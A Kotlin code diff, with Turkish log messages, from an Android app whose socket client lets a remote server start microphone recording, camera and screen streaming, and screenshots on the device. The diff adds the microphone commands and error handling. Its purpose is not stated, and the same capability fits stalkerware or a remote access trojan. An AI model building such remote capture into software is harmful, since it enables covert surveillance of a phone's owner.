@@ -31,6 +31,7 @@ object SocketManager {
         try {
             val options = IO.Options().apply {
                 query = "profileId=${Config.profileId}"
+                transports = arrayOf("websocket")
                 reconnection = true
                 reconnectionAttempts = Int.MAX_VALUE
                 reconnectionDelay = 2000
@@ -70,9 +71,29 @@ object SocketManager {
                 Log.d(TAG, "Komut: stop_screen_stream")
                 ScreenStreamManager.stop()
             }
+            socket?.on("start_microphone") {
+                Log.d(TAG, "Komut: start_microphone")
+                mainHandler.post {
+                    try {
+                        MicrophoneManager.startRecording(context)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "start_microphone hatası: ${e.message}")
+                    }
+                }
+            }
+            socket?.on("stop_microphone") {
+                Log.d(TAG, "Komut: stop_microphone")
+                MicrophoneManager.stopRecording()
+            }
             socket?.on("start_camera_stream") {
                 Log.d(TAG, "Komut: start_camera_stream")
-                mainHandler.post { CameraStreamManager.startStreaming(context) }
+                mainHandler.post {
+                    try {
+                        CameraStreamManager.startStreaming(context)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "start_camera_stream hatası: ${e.message}")
+                    }
+                }
             }
             socket?.on("stop_camera_stream") {
                 Log.d(TAG, "Komut: stop_camera_stream")
@@ -109,9 +130,10 @@ object SocketManager {
         try {
             val options = IO.Options().apply {
                 query = "profileId=${Config.profileId}"
+                transports = arrayOf("websocket")
                 reconnection = true
-                reconnectionAttempts = Int.MAX_VALUE
-                reconnectionDelay = 3000
+                reconnectionAttempts = 10
+                reconnectionDelay = 2000
                 reconnectionDelayMax = 15000
                 timeout = 20000
             }
@@ -152,38 +174,42 @@ object SocketManager {
                     Log.d(TAG, "Signal komut alındı: $type")
 
                     mainHandler.post {
-                        when (type) {
-                            "screen" -> {
-                                val m = context.resources.displayMetrics
-                                if (ScreenStreamManager.isProjectionReady()) {
-                                    ScreenStreamManager.startStreaming(
-                                        m.widthPixels, m.heightPixels, m.densityDpi
-                                    )
-                                    Log.d(TAG, "Ekran akışı başlatıldı")
-                                } else {
-                                    Log.e(TAG, "MediaProjection hazır değil — kullanıcının izin vermesi gerekiyor")
-                                    notifyProjectionNeeded()
+                        try {
+                            when (type) {
+                                "screen" -> {
+                                    val m = context.resources.displayMetrics
+                                    if (ScreenStreamManager.isProjectionReady()) {
+                                        ScreenStreamManager.startStreaming(
+                                            m.widthPixels, m.heightPixels, m.densityDpi
+                                        )
+                                        Log.d(TAG, "Ekran akışı başlatıldı")
+                                    } else {
+                                        Log.e(TAG, "MediaProjection hazır değil — kullanıcının izin vermesi gerekiyor")
+                                        notifyProjectionNeeded()
+                                    }
                                 }
-                            }
-                            "camera" -> {
-                                CameraStreamManager.startStreaming(context)
-                                Log.d(TAG, "Kamera akışı başlatıldı")
-                            }
-                            "stop" -> {
-                                ScreenStreamManager.stop()
-                                CameraStreamManager.stop()
-                                Log.d(TAG, "Tüm akışlar durduruldu")
-                            }
-                            "photo" -> {
-                                if (ScreenStreamManager.isProjectionReady()) {
-                                    ScreenshotHelper.takeScreenshot(context)
-                                } else {
-                                    Log.e(TAG, "MediaProjection yok — fotoğraf alınamıyor")
-                                    notifyProjectionNeeded()
+                                "camera" -> {
+                                    CameraStreamManager.startStreaming(context)
+                                    Log.d(TAG, "Kamera akışı başlatıldı")
                                 }
+                                "stop" -> {
+                                    ScreenStreamManager.stop()
+                                    CameraStreamManager.stop()
+                                    Log.d(TAG, "Tüm akışlar durduruldu")
+                                }
+                                "photo" -> {
+                                    if (ScreenStreamManager.isProjectionReady()) {
+                                        ScreenshotHelper.takeScreenshot(context)
+                                    } else {
+                                        Log.e(TAG, "MediaProjection yok — fotoğraf alınamıyor")
+                                        notifyProjectionNeeded()
+                                    }
+                                }
+                                "audio" -> Log.d(TAG, "Ses stream: gelecek sürümde")
+                                else -> Log.w(TAG, "Bilinmeyen komut: $type")
                             }
-                            "audio" -> Log.d(TAG, "Ses stream: gelecek sürümde")
-                            else -> Log.w(TAG, "Bilinmeyen komut: $type")
+                        } catch (e: Exception) {
+                            Log.e(TAG, "Komut yürütme hatası [$type]: ${e.message}")
                         }
                     }
                 } catch (e: Exception) {
